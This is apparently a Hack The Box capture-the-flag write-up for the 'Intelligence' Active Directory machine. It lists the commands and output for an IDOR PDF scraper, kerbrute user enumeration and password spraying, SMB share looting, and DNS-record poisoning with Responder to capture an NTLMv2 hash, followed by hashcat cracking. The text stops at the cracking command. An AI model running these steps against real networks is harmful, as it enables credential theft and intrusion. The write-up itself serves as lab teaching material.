---
title: Intelligence - HTB Writeup
date: 2024-04-22 10:03
categories: [ctf, windows, medium, ad]
tags: [htb, windows, ctf, medium, ad]    # TAG names should be lowercase
---

# Machine Info

Intelligence involves exploiting IDOR to find pdf files, which hold the default password for **Tiffany.Molina**. For Privilege Escalation, we will be performing Delegation attack to get the NTLMv2 hash for Ted.Graves user, which is the user of ITSupport group, which has **ReadGMSAPassword** rights on **SVC_INT.intelligence.htb**. SVC.INIT  has Delegate writes on th domain controller, which we will be using to impersonate as administrator on the DC.

![Pasted image 20240422213511](https://github.com/iammR0OT/HTB/assets/74102381/56c5c9a8-f078-4e83-833d-39dbbb4098ae)

# User 
## Scanning through Nmap

First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** used to scan the whole **65535** ports with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network and get only the open ports using different terminal tools like **cut**, **tr** etc. The whole command will be 

```shell
$ nmap -p- --min-rate 10000 10.10.10.175 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49719,52258
```

Now Let's run the depth scan on these specific ports using 

```bash
$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49719,52258 -sC -sV -A -T4 10.10.10.175 -oN scan.txt
```


- **-sC** is to run all the default scripts, 
- **-sV** for service and version detection,
- **-A** for Enable OS detection, version detection, script scanning, and traceroute,
- **-T4** for aggressive scan 
- **-oN** to write the result into a specified file.

```shell
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-26 00:40:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-26T00:41:37+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2024-01-26T00:19:23
|_Not valid after:  2025-01-25T00:19:23
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2024-01-26T00:19:23
|_Not valid after:  2025-01-25T00:19:23
|_ssl-date: 2024-01-26T00:41:38+00:00; +6h59m56s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-26T00:41:37+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2024-01-26T00:19:23
|_Not valid after:  2025-01-25T00:19:23
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2024-01-26T00:19:23
|_Not valid after:  2025-01-25T00:19:23
|_ssl-date: 2024-01-26T00:41:38+00:00; +6h59m56s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
52258/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m55s, deviation: 0s, median: 6h59m55s
| smb2-time: 
|   date: 2024-01-26T00:40:59
|_  start_date: N/A
```


## Information Gathering

Through **Nmap** we found port **53 DN**S is open which can be used to perform zone transfer, **80 http** web port is open, **88 kerberose** is open which can be used to for enumeration and authentication purpose here, **139 & 445 SMB** ports are open and can be used to enumerate shares with anonymous user for initial access, **389 ldap** port is open, **5985 winrm** port is opened which can be used to login into machine if somehow we managed to obtain a valid credentials. Nmap discover Doamin name by using **ldap** scripts which is **intelligence.htb** and CNAME **dc.intelligence.htb** . Let's add this to our local DNS file called `/etc/hots` so that our computer can resolve domain

```shell
$ cat /etc/hosts | grep intel
10.10.10.248  intelligence.htb dc.intelligence.htb
```

### 53 DNS

Let's start with the port **53** DNS and try to perform zone using **dig** (**dig** stands for **Domain Information Grabber**. It is used for retrieving information about DNS name servers. It is used for verifying and troubleshooting DNS problems and to perform DNS lookups). The complete command will be 

```bash
dig axfr @10.10.10.248 dc.intelligence.htb
```

Here **axfr** is a protocol(AXFR is **a protocol for “zone transfers” for replication of DNS data across multiple DNS servers**. Unlike normal DNS queries that require the user to know some DNS information ahead of time, **AXFR** queries reveal resource records including subdomain names). But we couldn't able to fetch any useful information.

```shell
$ dig axfr @10.10.10.248 dc.intelligence.htb

; <<>> DiG 9.19.19-1-Debian <<>> axfr @10.10.10.248 dc.intelligence.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.```
```

```shell 
$ dig axfr @10.10.10.248 intelligence.htb 

; <<>> DiG 9.19.19-1-Debian <<>> axfr @10.10.10.248 intelligence.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

We didn't fond anything using zone tarnsfer. Now, Let's perform subdomain Enumeration on that specific DNS server using **gobuster**

```bash
$ gobuster dns -d intelligence.htb  --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r 10.10.10.248:53
```

-  **-r** is used to check in remote DNS server **IP:port** which we provide. It discover some, Lets add these also to our `/etc/hosts` file

```shell
 $ gobuster dns -d intelligence.htb  --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r 10.10.10.248:53 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     intelligence.htb
[+] Threads:    10
[+] Resolver:   10.10.10.248:53
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dc.intelligence.htb

Found: gc._msdcs.intelligence.htb

Found: domaindnszones.intelligence.htb

Found: forestdnszones.intelligence.htb
```

### 139 & 445 SMB

We also have SMB ports open, let's try to list out smb shares if are available publicly using **smbclient**(The smbclient lets you **send messages to workstations, display browse lists and connect to SMB shares**). The command will be `smbclient -N -L \\10.10.10.248` here **-N** is for no-pass and **-L** for listing shares.. But there is no share available for us.

```shell
$ smbclient -N -L \\\\10.10.10.248\\       
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

### 389 LDAP  & 363 LDAPs

**ldapsearch** is a command-line tool that **opens a connection to an LDAP server, binds to it, and performs a search using a filter**. The results are then displayed in the LDIF. The LDIF is used to represent LDAP entries in a simple text format.
Using **ldapsearch** we can enumerate user's in domain  [naming context](https://en.wikipedia.org/wiki/Naming_Context), naming context etc. Let's First discover naming context of domain. The command will be `ldapsearch  -x -H ldap://10.10.10.248 -s base namingcontexts`
here **-x** for simple authentication, **-H** for host, **-s** to set scope to base and the **namingcontext** for getting naming context of domain

```shell
ldapsearch  -x -H ldap://10.10.10.248 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb
```
### 80 HTTP

Let's move to port 80 http.

<img alt="Pasted image 20240126193102" src="https://github.com/iammR0OT/HTB/assets/74102381/8cfafac6-4cc3-48e8-930c-1a3bc6ae3324">

This is a static webpage with some download document's features with document's names as a dates like **2020-01-01-upload.pdf**.

<img alt="Pasted image 20240126193252" src="https://github.com/iammR0OT/HTB/assets/74102381/fccd4ab5-1ade-46c1-aa41-297b999ae991">

We can perform here **IDOR** to find potential documents by creating a wordlist using python script. Let's **chatGPT** to create a wordlist for us using our requirements.  **File name is 2020-01-01-upload.pdf, i want to create a wordlist using python which has list from 2020-01-01-upload.pdf to 2020-12-31-upload.pdf**

```python
from datetime import datetime, timedelta

def generate_wordlist(start_date, end_date):
    pattern = "%Y-%m-%d-upload.pdf"
    current_date = start_date

    wordlist = []

    while current_date <= end_date:
        formatted_date = current_date.strftime(pattern)
        wordlist.append(formatted_date)
        current_date += timedelta(days=1)

    return wordlist

def save_wordlist(wordlist, filename):
    with open(filename, 'w') as file:
        for word in wordlist:
            file.write(word + '\n')

if __name__ == "__main__":
    start_date_str = "2020-01-01"
    end_date_str = "2020-12-31"

    start_date = datetime.strptime(start_date_str, "%Y-%m-%d")
    end_date = datetime.strptime(end_date_str, "%Y-%m-%d")

    generated_wordlist = generate_wordlist(start_date, end_date)
    save_wordlist(generated_wordlist, "wordlist.txt")
```
```
$ tail wordlist.txt 
2020-12-22-upload.pdf
2020-12-23-upload.pdf
2020-12-24-upload.pdf
2020-12-25-upload.pdf
2020-12-26-upload.pdf
2020-12-27-upload.pdf
2020-12-28-upload.pdf
2020-12-29-upload.pdf
2020-12-30-upload.pdf
2020-12-31-upload.pdf
```

Now let's try to fuzz documents directory using this wordlists using tool called **ffuf**.  and we found a bunch of pdf files there.

```bash
$ ffuf -u http://intelligence.htb/documents/FUZZ -w wordlist.txt -c
 
2020-01-23-upload.pdf
2020-01-20-upload.pdf
2020-01-01-upload.pdf
2020-01-10-upload.pdf
2020-01-02-upload.pdf
2020-01-04-upload.pdf
2020-02-17-upload.pdf
2020-01-25-upload.pdf
2020-01-22-upload.pdf
2020-01-30-upload.pdf
2020-02-28-upload.pdf
2020-02-11-upload.pdf
2020-03-17-upload.pdf
2020-03-21-upload.pdf
2020-02-23-upload.pdf
2020-02-24-upload.pdf
2020-04-02-upload.pdf
2020-04-04-upload.pdf
2020-03-05-upload.pdf
2020-03-04-upload.pdf
2020-03-12-upload.pdf
2020-04-15-upload.pdf
2020-03-13-upload.pdf
2020-04-23-upload.pdf
2020-05-11-upload.pdf
2020-05-20-upload.pdf
2020-05-24-upload.pdf
2020-05-21-upload.pdf
2020-05-29-upload.pdf
2020-06-03-upload.pdf
2020-06-02-upload.pdf
2020-05-01-upload.pdf
2020-06-04-upload.pdf
2020-06-08-upload.pdf
2020-06-07-upload.pdf
2020-05-03-upload.pdf
2020-06-12-upload.pdf
2020-05-07-upload.pdf
2020-06-14-upload.pdf
2020-06-15-upload.pdf
2020-05-17-upload.pdf
2020-06-25-upload.pdf
2020-06-26-upload.pdf
2020-06-30-upload.pdf
2020-07-02-upload.pdf
2020-07-08-upload.pdf
2020-07-20-upload.pdf
2020-06-22-upload.pdf
2020-07-24-upload.pdf
2020-06-21-upload.pdf
2020-08-01-upload.pdf
2020-06-28-upload.pdf
2020-08-03-upload.pdf
2020-07-06-upload.pdf
2020-08-09-upload.pdf
2020-08-20-upload.pdf
2020-08-19-upload.pdf
2020-09-04-upload.pdf
2020-09-05-upload.pdf
2020-09-11-upload.pdf
2020-09-13-upload.pdf
2020-09-27-upload.pdf
2020-09-30-upload.pdf
2020-09-29-upload.pdf
2020-10-05-upload.pdf
2020-09-02-upload.pdf
2020-09-06-upload.pdf
2020-10-19-upload.pdf
2020-09-16-upload.pdf
2020-09-22-upload.pdf
2020-11-01-upload.pdf
2020-11-03-upload.pdf
2020-11-06-upload.pdf
2020-11-10-upload.pdf
2020-11-13-upload.pdf
2020-11-24-upload.pdf
2020-11-30-upload.pdf
2020-12-15-upload.pdf
2020-12-20-upload.pdf
2020-11-11-upload.pdf
2020-12-24-upload.pdf
2020-12-28-upload.pdf
2020-12-30-upload.pdf
2020-12-10-upload.pdf
```

Here we have a bunch of pdf files and reading all of them will be very scary. Lets make it again automated using python script. Let's move to **chatGPT** again and paste our requirements.

```python
import datetime
import io
import PyPDF2
import requests


t = datetime.datetime(2020, 1, 1)
end = datetime.datetime(2021, 7, 4)
keywords = ['user', 'password', 'account', 'intelligence', 'htb', 'login', 'service', 'new']
users = set()

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
    resp = requests.get(url)
    if resp.status_code == 200:
        with io.BytesIO(resp.content) as data:
            pdf = PyPDF2.PdfFileReader(data)
            users.add(pdf.getDocumentInfo()['/Creator'])
            for page in range(pdf.getNumPages()):
                text = pdf.getPage(page).extractText()
                if any([k in text.lower() for k in keywords]):
                    print(f'==={url}===\n{text}')
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break

with open('users', 'w') as f:
    f.write('\n'.join(users)) 
```

Found a default Password "**NewIntelligenceCorpUser9876**" for someone in the domain and a list of users from the **metadate** of file, to check valid users we can use **kerbrute** 

<img alt="Pasted image 20240126220506" src="https://github.com/iammR0OT/HTB/assets/74102381/2acd6d7e-0f51-4af1-9419-a640af310505">

### 88 Kerberose

**kerbrute**(A tool to quickly bruteforce and enumerate valid Active Directory accounts through **Kerberos Pre-Authentication**) . it can also be used to perform password spraying on domain if somehow we managed to find a valid password. **Kerbrute** provide us many functions including

```
Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit
```

We will be using that **userenum** function. The command we will use will be `kerbrute userenum -d intelligence.htb  users --dc 10.10.10.248` here **-d** is for domain name and **--dc** for domain controller.

```shell
$ kerbrute userenum -d intelligence.htb  users --dc 10.10.10.248

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/26/24 - Ronnie Flathers @ropnop

2024/01/26 12:08:09 >  Using KDC(s):
2024/01/26 12:08:09 >  	10.10.10.248:88

2024/01/26 12:08:10 >  [+] VALID USERNAME:	 John.Coleman@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Danny.Matthews@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Samuel.Richardson@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 David.Wilson@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 David.Reed@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 David.Mcbride@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Teresa.Williamson@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Thomas.Hall@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Scott.Scott@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Jason.Wright@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Travis.Evans@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Brian.Morris@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Veronica.Patel@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Jessica.Moody@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Stephanie.Young@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Jose.Williams@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Anita.Roberts@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Ian.Duncan@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Nicole.Brock@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 William.Lee@intelligence.htb
2024/01/26 12:08:10 >  [+] VALID USERNAME:	 Darryl.Harris@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Richard.Williams@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Tiffany.Molina@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Jennifer.Thomas@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Jason.Patterson@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Brian.Baker@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Daniel.Shelton@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Kaitlyn.Zimmerman@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Thomas.Valenzuela@intelligence.htb
2024/01/26 12:08:11 >  [+] VALID USERNAME:	 Kelly.Long@intelligence.htb
```

#### Password Spraying

Now we have a list of username and a single password. Let's perform **Password Spraying** attack (**a type of brute force attack where a malicious actor attempts the same password on many accounts before moving on to another one and repeating the process**.). We will use again tool called kerbrute. We able to found one valid pair credientials `Tiffany.Molina: NewIntelligenceCorpUser9876`

```shell
$ kerbrute passwordspray --dc 10.10.10.248 -d intelligence.htb users NewIntelligenceCorpUser9876

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/26/24 - Ronnie Flathers @ropnop

2024/01/26 12:14:35 >  Using KDC(s):
2024/01/26 12:14:35 >  	10.10.10.248:88

2024/01/26 12:14:36 >  [+] VALID LOGIN WITH ERROR:	 Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876	 (Clock skew is too great)
```

## Exploitation

Now we have a pair of valid credentials. Let's check if can get shell using these. We will use tools called **crackmapexec** on winrm to check if we can go into that user account. But we failed.

```shell
$ crackmapexec winrm  target intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
SMB         10.10.10.248    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
HTTP        10.10.10.248    5985   DC               [*] http://10.10.10.248:5985/wsman
HTTP        10.10.10.248    5985   DC               [-] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
Running CME against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Now Let's check we can enumerate shares using these credentials. According to crackmapexec we can list shares.

```shell
$ crackmapexec smb  target intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
Running CME against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Now List shares using smbclient.

```shell
$ smbclient -L \\10.10.10.248 --user='intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876'

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
```

Now instead of checking each share one by one, we can use **smbmap** (**SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks**.) to do it for us recursively 

```shell
$ smbmap  -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -H 10.10.10.248  -r                

[+] IP: 10.10.10.248:445	Name: intelligence.htb    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	./IPC$
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
	fr--r--r--               16 Sun Dec 31 19:03:58 1600	lsass
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-39c-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-1b4-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-130-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
	fr--r--r--               13 Sun Dec 31 19:03:58 1600	wkssvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-4e4-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-258-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-258-1
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\49683
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	a4da408e903829bf
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\593
	fr--r--r--                6 Sun Dec 31 19:03:58 1600	srvsvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	winreg
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	netdfs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	efsrpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	vgauth-service
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-244-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	cert
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-270-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-874-0
	IT                                                	READ ONLY	
	./IT
	dr--r--r--                0 Sun Apr 18 20:50:58 2021	.
	dr--r--r--                0 Sun Apr 18 20:50:58 2021	..
	fr--r--r--             1046 Sun Apr 18 20:50:58 2021	downdetector.ps1
	NETLOGON                                          	READ ONLY	Logon server share 
	./NETLOGON
	dr--r--r--                0 Sun Apr 18 20:42:14 2021	.
	dr--r--r--                0 Sun Apr 18 20:42:14 2021	..
	SYSVOL                                            	READ ONLY	Logon server share 
	./SYSVOL
	dr--r--r--                0 Sun Apr 18 20:42:14 2021	.
	dr--r--r--                0 Sun Apr 18 20:42:14 2021	..
	dr--r--r--                0 Sun Apr 18 20:42:14 2021	intelligence.htb
	Users                                             	READ ONLY	
	./Users
	dw--w--w--                0 Sun Apr 18 21:20:26 2021	.
	dw--w--w--                0 Sun Apr 18 21:20:26 2021	..
	dr--r--r--                0 Sun Apr 18 20:18:39 2021	Administrator
	dr--r--r--                0 Sun Apr 18 23:16:30 2021	All Users
	dw--w--w--                0 Sun Apr 18 22:17:40 2021	Default
	dr--r--r--                0 Sun Apr 18 23:16:30 2021	Default User
	fr--r--r--              174 Sun Apr 18 23:15:17 2021	desktop.ini
	dw--w--w--                0 Sun Apr 18 20:18:39 2021	Public
	dr--r--r--                0 Sun Apr 18 21:20:26 2021	Ted.Graves
	dr--r--r--                0 Sun Apr 18 20:51:46 2021	Tiffany.Molina
```

Now Let's go to Tiffany.Molina User Desktop directory to get our user flag.

```shell
$ smbclient  \\\\10.10.10.248\\Users --user='intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' 
Try "help" to get a list of possible commands.
smb: \> cd Tiffany.Molina
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Fri Jan 26 19:32:28 2024

		3770367 blocks of size 4096. 1461801 blocks available
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\> 
```

# Privilege Escalation

In Share we see that there is a share with the name on **IT** and it have a powershell script in it called **downdetector.ps1**. after downloading it we discover that it is some kind of script which is trying to use PowerShell to check the status of web servers in Active Directory and send an email notification to **Ted.graves** if the record not found.

```shell
$ cat downdetector.ps1 
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

So according to this script we can perform **Delegation** attack (Delegation refers to **the transfer of responsibility for specific tasks from one person to another**). We will add DNS record and assign it our IP address so that whenever it request that dns record it will come to our IP address and when **Ted.graves** try to authenticate, we can steal it's NTLMv2 hash. To add DNS record we will use tool called **dnstool.py**. This script has autoload feature enabled for after every five minutes. 
In command **-u** denotes for user, **-p** for password, **--action** or **-a** to describe the action like add, modify or delete record, **--record** or **-r** denotes the record name which we want to add, **--data** or **-d** denotes the data we want to add in the DNS record and **--type** or **-t** denotes the type of DNS record like **A, AAAA, CMX** etc

```shell
python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-test --data 10.10.16.9 --type A 10.10.10.248      
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Now we have to wait for five minutes so to load that script again. After five minutes we got the NTLMv2 hash of **Ted.Graves** user.

```shell
$ sudo responder -I tun0                 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
	.
	.
	.
[+] Current Session Variables:
    Responder Machine Name     [WIN-HC2HZRE3SZG]
    Responder Domain Name      [AN1S.LOCAL]
    Responder DCE-RPC Port     [47474]

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:a05b4d5954cda62a:01BC90791F5A1B20749132515E433B9E:0101000000000000A4A107B5EE50DA018834B39CA222C60B000000000200080041004E003100530001001E00570049004E002D0048004300320048005A0052004500330053005A0047000400140041004E00310053002E004C004F00430041004C0003003400570049004E002D0048004300320048005A0052004500330053005A0047002E0041004E00310053002E004C004F00430041004C000500140041004E00310053002E004C004F00430041004C000800300030000000000000000000000000200000D7A1E0644E31207B7101AD61404F4965074792A2EA942AAC10A32C3DCF11913E0A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D0074006500730074002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Now Lets crack the password using **hashcat** (Hashcat is **a password cracking tool used for licit and illicit purposes**. Hashat is a particularly fast, efficient, and versatile hacking tool that assists brute-force attacks by conducting them with hash values of passwords that the tool is guessing or applying). It crack the hash within a minute. `TED.GRAVES: Mr.Teddy`

```shell
hashcat hash rockyou.txt

